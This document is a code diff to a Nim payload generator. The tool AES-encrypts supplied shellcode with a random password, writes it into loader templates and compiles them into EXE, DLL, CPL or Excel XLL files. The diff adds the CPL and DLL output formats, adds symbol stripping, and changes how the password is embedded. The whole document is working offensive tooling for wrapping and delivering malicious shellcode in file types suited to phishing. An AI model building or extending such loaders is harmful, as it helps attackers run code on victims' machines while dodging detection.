@@ -24,6 +24,7 @@ var
     templatePath: string
     shellcode: string
     scArray: seq[byte]
+    aesPasswd: string
     shaKey: MDigest[256]
     key: array[aes256.sizeKey, byte]
     iv: array[aes256.sizeBlock, byte]
@@ -46,9 +47,11 @@ else:
         verbosity = args[3]
 
 let
-    compileExe: string = r"nim c -d:mingw --opt:none --app=gui --cpu=amd64 -d:strip -d:release -o=simpleexe.exe temp_simpleexe.nim" 
-    compileXll64: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -o=simplexll.xll temp_simplexll.nim"
-    compileXll32: string = r"nim c -d:mingw --app=lib --nomain --cpu=i386 -o=simplexll.xll temp_simplexll.nim"
+    compileExe: string = r"nim c -d:mingw --opt:none --app=gui --cpu=amd64 -d:strip -d:release -o=simpleexe.exe temp_simpleexe.nim"
+    compileCpl: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -d:strip -o=simplecpl.cpl temp_simplecpl.nim"
+    compileDll: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -d:strip -o=simpledll.dll temp_simpledll.nim"
+    compileXll64: string = r"nim c -d:mingw --app=lib --nomain --cpu=amd64 -d:strip -o=simplexll.xll temp_simplexll.nim"
+    compileXll32: string = r"nim c -d:mingw --app=lib --nomain --cpu=i386 -d:strip -o=simplexll.xll temp_simplexll.nim"
 
 proc aesencrypt(): void = 
     
@@ -58,14 +61,13 @@ proc aesencrypt(): void =
 
     scArray = shellcode.toByteSeq
 
-    echo "\nscArray inside aesencrypt: ", toHex(scArray)
     encSC = newSeq[byte](len(scArray))
 
     randomize()
     const asciiRange = 32..126
-    let passwd = 32.newSeqWith(asciiRange.rand.char).join
-    var expandedKey = sha256.digest(passwd)
-    shaKey = expandedKey
+    aesPasswd = 32.newSeqWith(asciiRange.rand.char).join
+    var expandedKey = sha256.digest(aesPasswd)
+    #shaKey = expandedKey
     copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
 
     discard randomBytes(addr iv[0], 16)
@@ -100,6 +102,11 @@ proc generatePayload(): void =
             templateFile = templatePath.readFile()
             tempFile = "temp_simpleexe.nim"
             compileCmd = compileExe
+        of "cpl":
+            templatePath = "templates/simpledll.nim"
+            templateFile = templatePath.readFile()
+            tempFile = "temp_simplecpl.nim"
+            compileCmd = compileCpl
         of "xll":
             templatePath = "templates/simplexll.nim"
             templateFile = templatePath.readFile()
@@ -113,8 +120,8 @@ proc generatePayload(): void =
             quit(1)
 
     let placeholder = "REPLACE_ME"
-    echo "scArray = ", scArray
-    echo "\n"
+    #echo "scArray = ", scArray
+    #echo "\n"
     echo "encSC = ", encSC
 
     let replacement =  toHex(encSC)
@@ -128,7 +135,7 @@ proc generatePayload(): void =
     let origPass = "BLANK_PASSWORD"
     try:
         echo "[*] Adding AES key to template file!"
-        templateFile = templateFile.replace(origPass, toHex(shaKey.data))
+        templateFile = templateFile.replace(origPass, aesPasswd)
         tempFile.writeFile(templateFile)
     except:
         echo "[-] Error: Cannot add AES key to template file!"
